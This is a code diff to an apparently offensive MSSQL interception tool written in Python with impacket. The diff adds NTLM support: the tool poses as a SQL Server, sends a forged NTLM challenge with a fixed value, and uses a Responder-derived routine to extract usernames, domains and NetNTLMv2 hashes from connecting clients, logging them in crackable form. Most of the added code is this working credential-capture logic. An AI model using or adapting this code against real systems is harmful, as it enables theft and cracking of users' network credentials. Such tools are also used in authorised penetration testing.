@@ -10,8 +10,6 @@
 #   impacket mssqlclient.py
 #   https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/capture/mssql.rb
 #
-# do zrobienia:
-# - naspisywanie server_name TDS_Login
 
 TDS_RESPONSE          = 4
 TDS_HEADER_SIZE       = 8
@@ -42,9 +40,16 @@ import re
 import socket
 from random import SystemRandom, randint
 
+from impacket import ntlm
+import struct
+import calendar
+import time
+import codecs
+
 from twisted.internet import protocol, reactor
 from impacket import tds, LOG, version
 from impacket.examples import logger
+from impacket.structure import Structure
 
 try:
     from OpenSSL import SSL, crypto
@@ -80,6 +85,12 @@ class TDSPreLogin:
         #print("offset:",option_value_offset)
         return option_value_offset
 
+class TDS_SSPI_Token(Structure):
+    structure = (
+        ('Type','<B=0xED'), # TDS_SSPI_TOKEN
+        ('Length','<H=8+len(Data)'),
+        ('Data',':'),
+    )
 
 class MSSQLServerProtocol(protocol.Protocol):
     def __init__(self):
@@ -90,6 +101,7 @@ class MSSQLServerProtocol(protocol.Protocol):
         self.key_pair = None
         self.cert = None
         self.client_encryption_req = None
+        self.challenge = b"12345678"
 
     def connectionMade(self):
         LOG.warning("incoming new connection")
@@ -192,6 +204,34 @@ class MSSQLServerProtocol(protocol.Protocol):
         if x:
             LOG.warning("regexp: %s%s%s",RED,x[0],END)
 
+# from Responder  - Responder/servers/MSSQL.py
+    def ParseSQLHash(self, data, Challenge):
+        SSPIStart     = data[8:]
+        LMhashLen     = struct.unpack('<H',data[20:22])[0]
+        LMhashOffset  = struct.unpack('<H',data[24:26])[0]
+        LMHash        = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen]
+        LMHash        = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
+        NthashLen     = struct.unpack('<H',data[30:32])[0]
+        NthashOffset  = struct.unpack('<H',data[32:34])[0]
+        NTHash        = SSPIStart[NthashOffset:NthashOffset+NthashLen]
+        NTHash        = codecs.encode(NTHash, 'hex').upper().decode('latin-1')
+        DomainLen     = struct.unpack('<H',data[36:38])[0]
+        DomainOffset  = struct.unpack('<H',data[40:42])[0]
+        Domain        = SSPIStart[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
+
+        UserLen       = struct.unpack('<H',data[44:46])[0]
+        UserOffset    = struct.unpack('<H',data[48:50])[0]
+        User          = SSPIStart[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
+
+        WriteHash = ""
+
+        if NthashLen == 24:
+            WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, LMHash, NTHash, codecs.encode(Challenge,'hex').decode('latin-1'))
+        if NthashLen > 60:
+            WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, codecs.encode(Challenge,'hex').decode('latin-1'), NTHash[:32], NTHash[32:])
+        LOG.warning("NetNTLMv2: %s",WriteHash)
+
+
     # Client => Proxy
     def dataReceived(self, data):
         if self.tls_enabled:
@@ -218,17 +258,31 @@ class MSSQLServerProtocol(protocol.Protocol):
                         break  
 
         packet = tds.TDSPacket(data)
-        # LOG.debug("TDS packet: %s",vars(packet))
+        LOG.debug("TDS packet: %s",vars(packet))
 
         if packet.fields['Type'] == tds.TDS_LOGIN7:
             login = tds.TDS_LOGIN(packet.fields['Data'])
-            if login['SSPILength'] > 0:
-                LOG.debug("TDS packet: %s",vars(login))
-                LOG.critical("NTLM not supported yet!!!")
-                self.transport.abortConnection()
-#                self.transport.loseConnection()
-                return
+#            if login['SSPILength'] > 0:
+#                LOG.debug("TDS packet: %s",vars(login))
+#                if Config.serverAddr != LOCAL_SERVER:
+#                    LOG.critical("NTLM supported only in server emulation mode!")
+#                    self.transport.abortConnection()
+#                    #self.transport.loseConnection()
+#                    return
             self.parseLogin(login)
+
+        if packet.fields['Type'] == tds.TDS_SSPI:
+            LOG.debug("TDS SSPI NTLM login!")
+
+            authenticateMessage = ntlm.NTLMAuthChallengeResponse()
+            authenticateMessage.fromString(packet.fields['Data'])
+            LOG.debug("TDS SSPI packet: %s",vars(authenticateMessage))
+
+            self.ParseSQLHash(packet.rawData,self.challenge)
+
+#            self.transport.abortConnection()
+#            return
+
 
         if packet.fields['Type'] == tds.TDS_PRE_LOGIN and self.before_prelogin:
             LOG.debug("client side: FOUND client prelogin")
@@ -280,7 +334,74 @@ class MSSQLServerProtocol(protocol.Protocol):
 
         if packet.fields['Type'] == tds.TDS_LOGIN7:
             # fake SQL Server response
-            data = b"\x04\x01\x01\xa5\x00D\x01\x00\xe3\x1b\x00\x01\x06m\x00a\x00s\x00t\x00e\x00r\x00\x06m\x00a\x00s\x00t\x00e\x00r\x00\xab^\x00E\x16\x00\x00\x02\x00%\x00C\x00h\x00a\x00n\x00g\x00e\x00d\x00 \x00d\x00a\x00t\x00a\x00b\x00a\x00s\x00e\x00 \x00c\x00o\x00n\x00t\x00e\x00x\x00t\x00 \x00t\x00o\x00 \x00'\x00m\x00a\x00s\x00t\x00e\x00r\x00'\x00.\x00\x03X\x00L\x002\x00\x00\x01\x00\x00\x00\xe3\x08\x00\x07\x05\x15\x04\xd0\x00\x00\x00\xe3\x0f\x00\x02\x06p\x00o\x00l\x00s\x00k\x00i\x00\x00\xab`\x00G\x16\x00\x00\x01\x00&\x00Z\x00m\x00i\x00e\x00n\x00i\x00o\x00n\x00o\x00 \x00u\x00s\x00t\x00a\x00w\x00i\x00e\x00n\x00i\x00a\x00 \x00j\x00\x19\x01z\x00y\x00k\x00a\x00 \x00n\x00a\x00 \x00p\x00o\x00l\x00s\x00k\x00i\x00.\x00\x03X\x00L\x002\x00\x00\x01\x00\x00\x00\xad6\x00\x01t\x00\x00\x04\x16M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00 \x00S\x00Q\x00L\x00 \x00S\x00e\x00r\x00v\x00e\x00r\x00\x00\x00\x00\x00\x0f\x00\x085\xe3\x13\x00\x04\x044\x000\x009\x006\x00\x044\x000\x009\x006\x00\xae\x01.\x00\x00\x00\x00\x09\x00`\x81\x14\xff\xe7\xff\xff\x00\x02\x02\x01\x02\x04\x01\x00\x05\x04\xff\xff\xff\xff\x06\x01\x00\x07\x01\x02\x08\x08\x00\x00\x00\x00\x00\x00\x00\x00\x09\x04\xff\xff\xff\xff\x09\x02\x00\x00\x00\x02\x01\x0a\x01\x00\x00\x00\x01\xff\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+            login = tds.TDS_LOGIN(packet.fields['Data'])
+            if login['SSPILength'] > 0:
+
+                token = login['SSPI']
+                computerName = "XL2.xl.local"
+                domainName = "xl.local"
+
+                messageType = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]
+
+                if messageType == 0x01:
+                    # NEGOTIATE_MESSAGE
+                    negotiateMessage = ntlm.NTLMAuthNegotiate()
+                    negotiateMessage.fromString(token)
+
+                    ansFlags = 0
+
+                    if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_56:
+                        ansFlags |= ntlm.NTLMSSP_NEGOTIATE_56
+                    if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_128:
+                        ansFlags |= ntlm.NTLMSSP_NEGOTIATE_128
+                    if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH:
+                        ansFlags |= ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH
+                    if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
+                        ansFlags |= ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
+                    if negotiateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
+                        ansFlags |= ntlm.NTLMSSP_NEGOTIATE_UNICODE
+                    if negotiateMessage['flags'] & ntlm.NTLM_NEGOTIATE_OEM:
+                        ansFlags |= ntlm.NTLM_NEGOTIATE_OEM
+
+                    ansFlags |= ntlm.NTLMSSP_NEGOTIATE_VERSION | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO | ntlm.NTLMSSP_TARGET_TYPE_SERVER | ntlm.NTLMSSP_NEGOTIATE_NTLM | ntlm.NTLMSSP_REQUEST_TARGET
+
+                    # Generate the AV_PAIRS
+                    av_pairs = ntlm.AV_PAIRS()
+                    #TODO: Put the proper data from SMBSERVER config
+                    av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = av_pairs[
+                        ntlm.NTLMSSP_AV_DNS_HOSTNAME] = computerName.encode('utf-16le')
+                    av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = av_pairs[
+                        ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = domainName.encode('utf-16le')
+                    av_pairs[ntlm.NTLMSSP_AV_TIME] = struct.pack('<q', (
+                            116444736000000000 + calendar.timegm(time.gmtime()) * 10000000))
+
+                    challengeMessage = ntlm.NTLMAuthChallenge()
+                    challengeMessage['flags'] = ansFlags
+                    challengeMessage['domain_len'] = len(domainName.encode('utf-16le'))
+                    challengeMessage['domain_max_len'] = challengeMessage['domain_len']
+                    challengeMessage['domain_offset'] = 40 + 16
+                    challengeMessage['challenge'] = self.challenge
+                    challengeMessage['domain_name'] = domainName.encode('utf-16le')
+                    challengeMessage['TargetInfoFields_len'] = len(av_pairs)
+                    challengeMessage['TargetInfoFields_max_len'] = len(av_pairs)
+                    challengeMessage['TargetInfoFields'] = av_pairs
+                    challengeMessage['TargetInfoFields_offset'] = 40 + 16 + len(challengeMessage['domain_name'])
+                    challengeMessage['Version'] = b'\xff' * 8
+                    challengeMessage['VersionLen'] = 8
+
+                    token = TDS_SSPI_Token()
+                    #token['Type'] = tds.TDS_SSPI_TOKEN
+                    token['Data'] = challengeMessage.getData()
+
+                    resp = tds.TDSPacket()
+                    resp['Type'] = tds.TDS_TABULAR
+                    # TDS_SSPI_TOKEN + 2 bytes len
+                    resp['Data'] = token.getData()
+                    data = resp.getData()
+
+                    #LOG.debug("ntlm_neg packet: %s",vars(negotiateMessage))
+            else:
+                data = b"\x04\x01\x01\xa5\x00D\x01\x00\xe3\x1b\x00\x01\x06m\x00a\x00s\x00t\x00e\x00r\x00\x06m\x00a\x00s\x00t\x00e\x00r\x00\xab^\x00E\x16\x00\x00\x02\x00%\x00C\x00h\x00a\x00n\x00g\x00e\x00d\x00 \x00d\x00a\x00t\x00a\x00b\x00a\x00s\x00e\x00 \x00c\x00o\x00n\x00t\x00e\x00x\x00t\x00 \x00t\x00o\x00 \x00'\x00m\x00a\x00s\x00t\x00e\x00r\x00'\x00.\x00\x03X\x00L\x002\x00\x00\x01\x00\x00\x00\xe3\x08\x00\x07\x05\x15\x04\xd0\x00\x00\x00\xe3\x0f\x00\x02\x06p\x00o\x00l\x00s\x00k\x00i\x00\x00\xab`\x00G\x16\x00\x00\x01\x00&\x00Z\x00m\x00i\x00e\x00n\x00i\x00o\x00n\x00o\x00 \x00u\x00s\x00t\x00a\x00w\x00i\x00e\x00n\x00i\x00a\x00 \x00j\x00\x19\x01z\x00y\x00k\x00a\x00 \x00n\x00a\x00 \x00p\x00o\x00l\x00s\x00k\x00i\x00.\x00\x03X\x00L\x002\x00\x00\x01\x00\x00\x00\xad6\x00\x01t\x00\x00\x04\x16M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00 \x00S\x00Q\x00L\x00 \x00S\x00e\x00r\x00v\x00e\x00r\x00\x00\x00\x00\x00\x0f\x00\x085\xe3\x13\x00\x04\x044\x000\x009\x006\x00\x044\x000\x009\x006\x00\xae\x01.\x00\x00\x00\x00\x09\x00`\x81\x14\xff\xe7\xff\xff\x00\x02\x02\x01\x02\x04\x01\x00\x05\x04\xff\xff\xff\xff\x06\x01\x00\x07\x01\x02\x08\x08\x00\x00\x00\x00\x00\x00\x00\x00\x09\x04\xff\xff\xff\xff\x09\x02\x00\x00\x00\x02\x01\x0a\x01\x00\x00\x00\x01\xff\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 
         if  packet.fields['Type'] == tds.TDS_SQL_BATCH:
             # fake empty one row one column response
@@ -290,8 +411,18 @@ class MSSQLServerProtocol(protocol.Protocol):
 
     # Proxy => Client
     def write(self, data):
+
+        packet = tds.TDSPacket(data)
+        if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['Data'][0] == tds.TDS_SSPI_TOKEN:
+            LOG.debug("TDS Response NTLMSSP_CHALLENGE packet recv")
+            token = TDS_SSPI_Token(packet.fields['Data'])
+            challengeMessage = ntlm.NTLMAuthChallenge()
+            challengeMessage.fromString(token.fields['Data'])
+            LOG.debug("TDS Response NTLMSSP_CHALLENGE packet recv: %s",vars(challengeMessage))
+            self.challenge = challengeMessage['challenge']
+            LOG.debug("TDS Response NTLMSSP_CHALLENGE: %s",challengeMessage['challenge'])
+
         if self.tls_enabled:
-            packet = tds.TDSPacket(data)
             while True:
                 try:
                     self.tls.sendall(data[:packet.fields['Length']])
@@ -308,10 +439,12 @@ class MSSQLServerProtocol(protocol.Protocol):
                 packet = tds.TDSPacket(data)
             return
         else:
-            packet = tds.TDSPacket(data)
-            if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['SPID'] == 0:
+            LOG.debug("TDS Response packet recv: %s",vars(packet))
+#            if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['SPID'] == 0:
+            if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['Data'][0] == 0:
+                LOG.debug("TDS Response Prelogin packet recv")
                 preloginResponse = TDSPreLogin(data)
-    
+
                 if self.client_encryption_req == tds.TDS_ENCRYPT_ON or self.client_encryption_req == tds.TDS_ENCRYPT_REQ: 
                     preloginResponse.setEncryptionOption(tds.TDS_ENCRYPT_ON)
                     data = preloginResponse.data
@@ -321,7 +454,6 @@ class MSSQLServerProtocol(protocol.Protocol):
                 if self.client_encryption_req == tds.TDS_ENCRYPT_OFF or self.client_encryption_req == tds.TDS_ENCRYPT_NOT_SUP: 
                     preloginResponse.setEncryptionOption(tds.TDS_ENCRYPT_NOT_SUP)
                     data = preloginResponse.data
-
             self.transport.write(data)
 
 
@@ -372,7 +504,8 @@ class MSSQLClientProtocol(protocol.Protocol):
                         break
 
         packet = tds.TDSPacket(data)
-        if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['SPID'] == 0:
+#        if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['SPID'] == 0:
+        if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['Data'][0] == 0:
             preloginResponse = TDSPreLogin(data)
 
             if (preloginResponse.getEncryptionOption() == tds.TDS_ENCRYPT_ON or preloginResponse.getEncryptionOption() == tds.TDS_ENCRYPT_REQ) and Config.serverRequiresEncryption:
@@ -500,7 +633,7 @@ def show_banner():
 ░  ░      ░ ▒ ░    ░    ░  ░      ░   ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░   ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░ ▓██ ░▒░ 
 ░      ░    ▒ ░  ░      ░      ░      ░  ░  ░     ░   ░   ░ ░      ░░         ░░   ░ ░ ░ ░ ▒   ░    ░   ▒ ▒ ░░  
        ░    ░                  ░            ░      ░        ░  ░               ░         ░ ░   ░    ░   ░ ░     
-                                                                                                        ░ ░     
+by Marcin Ochab                                                                                         ░ ░     
 {END}"""
     print(banner)
 
